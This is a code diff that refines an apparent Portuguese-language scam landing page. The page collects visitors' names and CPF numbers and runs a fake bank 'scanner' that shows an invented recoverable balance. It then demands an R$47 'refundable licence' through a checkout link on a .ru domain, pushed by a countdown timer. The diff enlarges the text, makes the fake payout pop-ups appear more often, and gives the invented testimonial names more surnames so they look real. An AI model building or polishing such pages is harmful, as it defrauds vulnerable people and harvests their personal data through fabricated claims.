@@ -33,78 +33,79 @@
             --dark-blue: #002d62;
         }
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Montserrat', sans-serif; }
-        body { background-color: var(--bg); color: var(--text); overflow-x: hidden; }
+        body { background-color: var(--bg); color: var(--text); overflow-x: hidden; font-size: 16px; }
 
-        .top-alert { background: #f59e0b; color: #000; padding: 12px; text-align: center; font-size: 11px; font-weight: 800; text-transform: uppercase; z-index: 999; position: relative; border-bottom: 1px solid #d97706; }
+        .top-alert { background: #f59e0b; color: #000; padding: 12px; text-align: center; font-size: 12px; font-weight: 800; text-transform: uppercase; z-index: 999; position: relative; border-bottom: 1px solid #d97706; }
         .navbar { background: var(--primary); padding: 15px; border-bottom: 2px solid #003070; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
         .logo-container { display: flex; flex-direction: column; color: #fff; }
-        .logo { font-weight: 900; font-size: 18px; display: flex; align-items: center; gap: 5px; }
-        .sub-logo { font-size: 9px; font-weight: 700; text-transform: uppercase; opacity: 0.9; margin-left: 28px; margin-top: -2px; }
-        .status-online { color: #fff; font-size: 10px; font-weight: 800; display: flex; align-items: center; gap: 4px; }
+        .logo { font-weight: 900; font-size: 20px; display: flex; align-items: center; gap: 5px; }
+        .sub-logo { font-size: 10px; font-weight: 700; text-transform: uppercase; opacity: 0.9; margin-left: 30px; margin-top: -2px; }
+        .status-online { color: #fff; font-size: 11px; font-weight: 800; display: flex; align-items: center; gap: 4px; }
         .dot { width: 8px; height: 8px; background: #00ff41; border-radius: 50%; animation: pulse 1s infinite; }
         @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
 
         .container { max-width: 500px; margin: 0 auto; padding: 20px; }
 
         .hero { text-align: center; margin-bottom: 20px; }
-        .hero h1 { font-size: 26px; font-weight: 900; line-height: 1.1; color: var(--dark-blue); margin-top: 15px; }
+        .hero h1 { font-size: 28px; font-weight: 900; line-height: 1.1; color: var(--dark-blue); margin-top: 15px; }
         mark { background-color: #ffeb3b; color: inherit; padding: 0 4px; border-radius: 4px; }
 
         .roberto-box { background: #fff; border-radius: 15px; padding: 20px; border: 1px solid #ddd; margin-bottom: 25px; box-shadow: 0 4px 10px rgba(0,0,0,0.05); }
         .roberto-header { display: flex; align-items: center; gap: 15px; margin-bottom: 15px; }
         .roberto-img { width: 80px; height: 80px; border-radius: 50%; border: 3px solid #eee; object-fit: cover; }
-        .roberto-info b { font-size: 16px; display: block; color: #111; }
-        .roberto-info span { font-size: 11px; font-weight: 700; color: #777; }
-        .roberto-text { font-size: 14px; color: #444; line-height: 1.5; font-weight: 500; font-style: italic; border-left: 3px solid var(--primary); padding-left: 10px; }
+        .roberto-info b { font-size: 18px; display: block; color: #111; }
+        .roberto-info span { font-size: 12px; font-weight: 700; color: #777; }
+        .roberto-text { font-size: 15px; color: #444; line-height: 1.6; font-weight: 500; font-style: italic; border-left: 3px solid var(--primary); padding-left: 10px; }
 
         .form-card { background: #fff; border-radius: 20px; padding: 25px; border: 1px solid #ddd; box-shadow: 0 10px 30px rgba(0,0,0,0.08); }
-        .form-card h2 { font-size: 19px; text-align: center; margin-bottom: 20px; font-weight: 900; color: var(--secondary); }
+        .form-card h2 { font-size: 21px; text-align: center; margin-bottom: 20px; font-weight: 900; color: var(--secondary); }
         .input-group { margin-bottom: 15px; }
-        label { display: block; font-size: 11px; font-weight: 800; color: #666; margin-bottom: 5px; margin-left: 5px; text-transform: uppercase; }
-        input, select { width: 100%; padding: 16px; border-radius: 12px; border: 1px solid #ddd; font-size: 16px; font-weight: 600; outline: none; background: #f9f9f9; }
-        .btn-main { background: var(--secondary); color: #fff; width: 100%; padding: 22px; border: none; border-radius: 12px; font-size: 16px; font-weight: 900; cursor: pointer; box-shadow: 0 6px 0 #118a3a; text-transform: uppercase; margin-top: 10px; }
+        label { display: block; font-size: 12px; font-weight: 800; color: #666; margin-bottom: 5px; margin-left: 5px; text-transform: uppercase; }
+        input, select { width: 100%; padding: 18px; border-radius: 12px; border: 1px solid #ddd; font-size: 17px; font-weight: 600; outline: none; background: #f9f9f9; }
+        .btn-main { background: var(--secondary); color: #fff; width: 100%; padding: 22px; border: none; border-radius: 12px; font-size: 18px; font-weight: 900; cursor: pointer; box-shadow: 0 6px 0 #118a3a; text-transform: uppercase; margin-top: 10px; }
 
         .stats-grid { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 10px; margin: 25px 0; text-align: center; }
-        .stat-item b { font-size: 17px; color: var(--primary); display: block; }
-        .stat-item span { font-size: 10px; font-weight: 800; color: #999; }
+        .stat-item b { font-size: 19px; color: var(--primary); display: block; }
+        .stat-item span { font-size: 11px; font-weight: 800; color: #999; }
 
-        .depo-title { font-weight: 900; font-size: 17px; margin-bottom: 15px; border-left: 5px solid var(--primary); padding-left: 10px; }
+        .depo-title { font-weight: 900; font-size: 19px; margin-bottom: 15px; border-left: 5px solid var(--primary); padding-left: 10px; }
         .card-depo { background: #fff; border-radius: 15px; padding: 15px; margin-bottom: 15px; border: 1px solid #eee; }
-        .depo-header { display: flex; justify-content: space-between; margin-bottom: 8px; }
-        .val-rec { color: var(--secondary); font-weight: 900; font-size: 16px; }
-        .depo-text { font-size: 13px; color: #555; line-height: 1.5; }
+        .depo-header { display: flex; justify-content: space-between; margin-bottom: 8px; font-size: 14px; }
+        .val-rec { color: var(--secondary); font-weight: 900; font-size: 18px; }
+        .depo-text { font-size: 14px; color: #555; line-height: 1.5; }
 
-        .btn-more { width: 100%; padding: 12px; background: transparent; border: 2px solid #ddd; border-radius: 10px; color: #888; font-weight: 700; cursor: pointer; margin-bottom: 20px; }
+        .btn-more { width: 100%; padding: 14px; background: transparent; border: 2px solid #ddd; border-radius: 10px; color: #888; font-weight: 700; cursor: pointer; margin-bottom: 20px; font-size: 15px; }
 
         .steps { background: #fff; border-radius: 20px; padding: 25px; margin: 30px 0; border: 1px solid #eee; }
         .step-item { display: flex; gap: 15px; margin-bottom: 25px; align-items: flex-start; }
-        .step-num { background: var(--primary); color: #fff; width: 42px; height: 42px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: 900; flex-shrink: 0; font-size: 20px; }
-        .step-info b { font-size: 16px; display: block; margin-bottom: 4px; }
-        .step-info p { font-size: 14px; line-height: 1.4; font-weight: 500; }
+        .step-num { background: var(--primary); color: #fff; width: 45px; height: 45px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: 900; flex-shrink: 0; font-size: 22px; }
+        .step-info b { font-size: 17px; display: block; margin-bottom: 4px; }
+        .step-info p { font-size: 15px; line-height: 1.5; font-weight: 500; }
 
-        #notification-box { position: fixed; bottom: 20px; left: 20px; right: 20px; background: #fff; border-radius: 12px; padding: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.2); display: flex; align-items: center; gap: 12px; z-index: 1000; transform: translateY(150%); transition: 0.5s ease; border-left: 5px solid var(--secondary); max-width: 400px; margin: 0 auto; }
+        #notification-box { position: fixed; bottom: 20px; left: 20px; right: 20px; background: #fff; border-radius: 12px; padding: 18px; box-shadow: 0 10px 40px rgba(0,0,0,0.3); display: flex; align-items: center; gap: 12px; z-index: 1000; transform: translateY(150%); transition: 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275); border-left: 6px solid var(--secondary); max-width: 420px; margin: 0 auto; }
         #notification-box.show { transform: translateY(0); }
-        .notif-text b { font-size: 13px; display: block; color: #333; }
-        .notif-text span { font-size: 11px; color: #666; }
-        .notif-val-highlight { color: #16a34a; font-weight: 900; font-size: 14px; display: block; margin-top: 2px; }
+        .notif-text b { font-size: 15px; display: block; color: #111; margin-bottom: 2px; }
+        .notif-text span { font-size: 13px; color: #444; font-weight: 600; }
+        .notif-val-highlight { color: #16a34a; font-weight: 900; font-size: 18px; display: block; margin-top: 4px; }
 
         .loader-circle { width: 60px; height: 60px; border: 6px solid #f3f3f3; border-top: 6px solid var(--primary); border-radius: 50%; margin: 0 auto 20px; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .bank-item { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid #f0f0f0; font-size: 13px; font-weight: 700; }
+        .bank-item { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid #f0f0f0; font-size: 14px; font-weight: 700; }
         .status-ok { color: var(--secondary); }
         .status-load { color: var(--primary); animation: pulse 1s infinite; }
 
         .result-card { background: #f0fff4; border: 2px dashed var(--secondary); padding: 30px 20px; border-radius: 20px; margin: 15px 0; text-align: center; }
-        .result-card h3 { font-size: 44px; font-weight: 900; color: #111; }
+        .result-card h3 { font-size: 48px; font-weight: 900; color: #111; }
         
-        .audit-details { background: #f8fafc; border-radius: 12px; padding: 15px; margin: 15px 0; text-align: left; border: 1px solid #e2e8f0; }
-        .audit-line { display: flex; justify-content: space-between; font-size: 12px; margin-bottom: 8px; font-weight: 600; }
-        .audit-line span { color: #64748b; }
-        .audit-line b { color: #1e293b; }
+        .audit-details { background: #f8fafc; border-radius: 15px; padding: 20px; margin: 20px 0; text-align: left; border: 1px solid #cbd5e1; }
+        .audit-line { display: flex; justify-content: space-between; font-size: 14px; margin-bottom: 12px; font-weight: 700; align-items: center; }
+        .audit-line span { color: #475569; flex: 1; }
+        .audit-line b { color: #0f172a; text-align: right; margin-left: 10px; }
+        .audit-line .status-badge { background: #dcfce7; color: #166534; padding: 4px 10px; border-radius: 6px; font-size: 12px; }
 
         .pix-container { background: #f9f9f9; border: 1px solid #ddd; border-radius: 12px; padding: 15px; margin-top: 15px; }
 
-        .footer { text-align: center; padding: 40px 20px; font-size: 12px; color: #1e293b; border-top: 2px solid var(--primary); line-height: 1.8; background: #e2e8f0; font-weight: 700; }
+        .footer { text-align: center; padding: 40px 20px; font-size: 13px; color: #1e293b; border-top: 2px solid var(--primary); line-height: 1.8; background: #e2e8f0; font-weight: 700; }
         .footer b { color: var(--primary); }
     </style>
 </head>
@@ -124,9 +125,9 @@
 
         <div id="step-1">
             <section class="hero">
-                <p style="font-size: 13px; font-weight: 800; color: #999;">Por: Roberto Menezes — Ex-Auditor Sênior</p>
+                <p style="font-size: 14px; font-weight: 800; color: #999;">Por: Roberto Menezes — Ex-Auditor Sênior</p>
                 <h1>Recupere <mark>valores</mark> vinculados ao seu cpf</h1>
-                <p style="font-size: 14px; color: #000; margin-top: 12px; font-weight: 700;">Consulta 100% gratuita usando seu CPF. Em menos de 1 minuto você descobre quanto o banco está te devendo.</p>
+                <p style="font-size: 16px; color: #000; margin-top: 12px; font-weight: 700;">Consulta 100% gratuita usando seu CPF. Em menos de 1 minuto você descobre quanto o banco está te devendo.</p>
             </section>
 
             <div class="roberto-box">
@@ -156,7 +157,7 @@
                 </div>
                 <button class="btn-main" onclick="startScanner()">🔍 CONSULTAR MEU SALDO AGORA</button>
                 
-                <p style="font-size: 11px; font-weight: 700; color: #666; text-align: center; margin-top: 15px;">
+                <p style="font-size: 12px; font-weight: 700; color: #666; text-align: center; margin-top: 15px;">
                     * Atenção: Os valores variam e são intercalados conforme o histórico de cada CPF.
                 </p>
             </div>
@@ -171,12 +172,12 @@
             
             <div id="depo-container">
                 <div class="card-depo">
-                    <div class="depo-header"><b>Cleusa Aparecida dos Santos</b> <span>Goiânia - GO (12/05/2026)</span></div>
+                    <div class="depo-header"><b>Cleusa Aparecida dos Santos</b> <span>Goiânia - GO</span></div>
                     <div class="val-rec">+R$ 2.340,42</div>
                     <p class="depo-text">"Fiquei com medo no começo, achei que era golpe. Mas minha filha me ajudou a fazer e caiu R$ 2.340,42 do Bradesco que eu nem sabia que tinha. Deus abençoe esse moço Roberto."</p>
                 </div>
                 <div class="card-depo">
-                    <div class="depo-header"><b>Antônio Ferreira da Silva Neto</b> <span>Recife - PE (12/05/2026)</span></div>
+                    <div class="depo-header"><b>Antônio Ferreira da Silva Neto</b> <span>Recife - PE</span></div>
                     <div class="val-rec">+R$ 2.810,89</div>
                     <p class="depo-text">"Trabalhei 40 anos de carteira assinada. O scanner achou R$ 2.810,89 que tava parado. Caiu no PIX em 12 minutos como prometido."</p>
                 </div>
@@ -205,11 +206,11 @@
         <div id="step-2" style="display: none;">
             <div class="form-card" style="text-align: center;">
                 <div class="loader-circle"></div>
-                <h3 style="font-size: 19px;">🔎 Consultando seu CPF...</h3>
-                <p style="font-size: 13px; margin-bottom: 20px;">Aguarde, <span class="u-nome" style="font-weight: 800;"></span></p>
+                <h3 style="font-size: 20px;">🔎 Consultando seu CPF...</h3>
+                <p style="font-size: 14px; margin-bottom: 20px;">Aguarde, <span class="u-nome" style="font-weight: 800;"></span></p>
                 
                 <div style="text-align: left; background: #fafafa; border-radius: 12px; padding: 15px; border: 1px solid #eee;">
-                    <p style="font-size: 11px; font-weight: 800; color: var(--primary); margin-bottom: 10px;">Verificando bancos vinculados ao CPF: <span id="u-cpf"></span></p>
+                    <p style="font-size: 12px; font-weight: 800; color: var(--primary); margin-bottom: 10px;">Verificando bancos vinculados ao CPF: <span id="u-cpf"></span></p>
                     <div id="b-list">
                         <div class="bank-item" data-time="1500"><span>Banco do Brasil</span> <small>aguardando</small></div>
                         <div class="bank-item" data-time="3200"><span>Caixa Econômica</span> <small>aguardando</small></div>
@@ -226,17 +227,17 @@
 
         <div id="step-3" style="display: none;">
             <div class="form-card">
-                <div style="background: #dcfce7; color: #166534; padding: 12px; border-radius: 10px; font-weight: 900; text-align: center; font-size: 14px; margin-bottom: 20px;">
+                <div style="background: #dcfce7; color: #166534; padding: 12px; border-radius: 10px; font-weight: 900; text-align: center; font-size: 15px; margin-bottom: 20px;">
                     ✅ Consulta Concluída — Valor Localizado!
                 </div>
                 
-                <p style="text-align: center; font-size: 15px; margin-bottom: 20px;">
+                <p style="text-align: center; font-size: 17px; margin-bottom: 20px;">
                     <span class="u-nome" style="font-weight: 800;"></span>, encontramos valores em seu CPF:<br>
-                    <b style="font-size: 12px; color: #777;" id="f-cpf"></b>
+                    <b style="font-size: 13px; color: #777;" id="f-cpf"></b>
                 </p>
 
                 <div class="result-card">
-                    <span style="font-size: 12px; font-weight: 800; color: var(--secondary); text-transform: uppercase;">💰 Saldo total disponível</span>
+                    <span style="font-size: 13px; font-weight: 800; color: var(--secondary); text-transform: uppercase;">💰 Saldo total disponível</span>
                     <h3 id="f-money">R$ 0,00</h3>
                 </div>
 
@@ -244,7 +245,7 @@
                     <div class="audit-line"><span>Instituições Consultadas:</span> <b>14 Bancos</b></div>
                     <div class="audit-line"><span>Tarifas Indevidas Localizadas:</span> <b>R$ <span id="val-tarifas"></span></b></div>
                     <div class="audit-line"><span>Juros de Contas Inativas:</span> <b>R$ <span id="val-juros"></span></b></div>
-                    <div class="audit-line" style="margin-top:10px; padding-top:10px; border-top: 1px solid #eee;"><span>Status do Saque:</span> <b style="color:var(--secondary)">LIBERADO</b></div>
+                    <div class="audit-line" style="margin-top:10px; padding-top:15px; border-top: 1px solid #cbd5e1;"><span>Status do Saque:</span> <b class="status-badge">LIBERADO</b></div>
                 </div>
 
                 <div class="pix-container">
@@ -257,29 +258,29 @@
                     <input type="text" placeholder="CPF, E-mail ou Celular...">
                 </div>
 
-                <h3 style="color: #ff0000; font-size: 18px; font-weight: 900; text-align: center; margin: 25px 0 15px;">⚠️ ÚLTIMA ETAPA: ATIVAÇÃO DA LICENÇA</h3>
+                <h3 style="color: #ff0000; font-size: 20px; font-weight: 900; text-align: center; margin: 25px 0 15px;">⚠️ ÚLTIMA ETAPA: ATIVAÇÃO DA LICENÇA</h3>
                 
-                <div style="font-size: 15px; line-height: 1.6; color: #333; margin-bottom: 20px; text-align: center; background: #fffdf0; padding: 15px; border: 1px solid #ffeeba; border-radius: 12px;">
+                <div style="font-size: 16px; line-height: 1.6; color: #333; margin-bottom: 20px; text-align: center; background: #fffdf0; padding: 15px; border: 1px solid #ffeeba; border-radius: 12px;">
                     <span class="u-nome" style="font-weight: 800;"></span>, para garantir que o saque seja feito pelo titular do CPF e evitar fraudes, é necessário ativar sua <b>Licença de Auditoria Individual</b>.<br><br>
                     <b>IMPORTANTE:</b> O valor da licença de R$ 47,00 é 100% REEMBOLSÁVEL e será devolvido automaticamente somado ao seu saque total de <b class="f-money-txt"></b>.
                 </div>
 
                 <div style="background: #fff; border: 2px solid var(--secondary); border-radius: 15px; padding: 20px; text-align: center; margin-bottom: 25px;">
-                    <span style="font-size: 12px; color: #999; text-decoration: line-through;">De R$ 97,00</span>
-                    <div style="font-size: 42px; font-weight: 900; color: var(--secondary);">R$ 47,00</div>
+                    <span style="font-size: 14px; color: #999; text-decoration: line-through;">De R$ 97,00</span>
+                    <div style="font-size: 46px; font-weight: 900; color: var(--secondary);">R$ 47,00</div>
                     <div style="display:flex; justify-content: space-around; margin-top: 15px; padding-top: 15px; border-top: 1px solid #eee;">
-                        <div><span style="display:block; font-size: 12px; color: #999; font-weight:800;">Encerra em</span><b style="color:#ff0000; font-size: 18px;" id="timer">05:00</b></div>
-                        <div><span style="display:block; font-size: 12px; color: #999; font-weight:800;">Saque no CPF</span><b style="font-size: 18px;">DISPONÍVEL (1)</b></div>
+                        <div><span style="display:block; font-size: 13px; color: #999; font-weight:800;">Encerra em</span><b style="color:#ff0000; font-size: 20px;" id="timer">05:00</b></div>
+                        <div><span style="display:block; font-size: 13px; color: #999; font-weight:800;">Saque no CPF</span><b style="font-size: 20px;">DISPONÍVEL (1)</b></div>
                     </div>
                 </div>
 
                 <a href="https://checkoutseguro.ru/checkout/cmnap6rte03461ro96zchoops?offer=DMBCE7O" 
                    onclick="fbq('track', 'InitiateCheckout');"
                    class="btn-main" 
-                   style="text-decoration: none; display: block; text-align: center; font-size: 18px;">🔓 LIBERAR MEU SAQUE AGORA</a>
+                   style="text-decoration: none; display: block; text-align: center; font-size: 20px;">🔓 LIBERAR MEU SAQUE AGORA</a>
 
                 <div class="roberto-box" style="margin-top: 25px; background: #fdfdfd; border-color: var(--danger);">
-                     <p style="font-size: 14px; color: #111; line-height: 1.6; font-weight: 600;">
+                     <p style="font-size: 15px; color: #111; line-height: 1.6; font-weight: 600;">
                         <b>Eu estou te avisando:</b> "<span class="u-nome"></span>, essa é a nossa última chamada. Garanta sua licença agora, receba seus <b class="f-money-txt"></b> e tenha os 47 reais devolvidos no mesmo PIX. Não deixe o banco ficar com o que é seu por direito."
                     </p>
                 </div>
@@ -308,12 +309,12 @@
             e.target.value = v.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
         });
 
-        // LISTA DE NOMES ALTERADA
+        // LISTA DE NOMES MELHORADA (2-3 SOBRENOMES)
         const usersPop = [
-            {n: "Bruno Menezes", c: "São Paulo/SP"}, {n: "Carla Viegas", c: "Salvador/BA"},
-            {n: "Rodrigo Alvez", c: "Brasília/DF"}, {n: "Juliana Costa", c: "Belo Horizonte/MG"},
-            {n: "Felipe Guedes", c: "Manaus/AM"}, {n: "Patrícia Lima", c: "Porto Alegre/RS"},
-            {n: "Daniel Souza", c: "Curitiba/PR"}, {n: "Aline Pereira", c: "Fortaleza/CE"}
+            {n: "Bruno Menezes de Souza"}, {n: "Carla Viegas Mendonça"},
+            {n: "Rodrigo Alvez Cavalcante"}, {n: "Juliana Costa Ferreira da Silva"},
+            {n: "Felipe Guedes de Oliveira"}, {n: "Patrícia Lima dos Santos"},
+            {n: "Daniel Souza de Albuquerque"}, {n: "Aline Pereira Guimarães"}
         ];
         
         function showNotification() {
@@ -323,16 +324,15 @@
             document.getElementById('notif-money').innerText = `R$ ${val} via PIX`;
             const box = document.getElementById('notification-box');
             box.classList.add('show');
-            setTimeout(() => box.classList.remove('show'), 8000);
+            setTimeout(() => box.classList.remove('show'), 6000);
         }
-        setInterval(showNotification, 18000);
+        setInterval(showNotification, 12000);
 
-        // LISTA DOS DEPOIMENTOS EXTRAS ALTERADA
         function loadMoreDepos() {
             const container = document.getElementById('depo-container');
             const novos = [
-                {n: "Sandra Regina", l: "Santos - SP (12/05/2026)", v: "1.650,10", t: "Fiz a consulta e o valor do meu FGTS inativo apareceu. Paguei os 47 e caiu tudo certinho na minha conta."},
-                {n: "Luiz Gustavo", l: "Campinas - SP (12/05/2026)", v: "3.120,45", t: "Estava precisando muito desse dinheiro. O sistema é muito rápido e o Roberto é nota 10."}
+                {n: "Sandra Regina Santos Silva", l: "Santos - SP", v: "1.650,10", t: "Fiz a consulta e o valor do meu FGTS inativo apareceu. Paguei os 47 e caiu tudo certinho na minha conta."},
+                {n: "Luiz Gustavo Moreira Ramos", l: "Campinas - SP", v: "3.120,45", t: "Estava precisando muito desse dinheiro. O sistema é muito rápido e o Roberto é nota 10."}
             ];
             novos.forEach(d => {
                 const div = document.createElement('div');
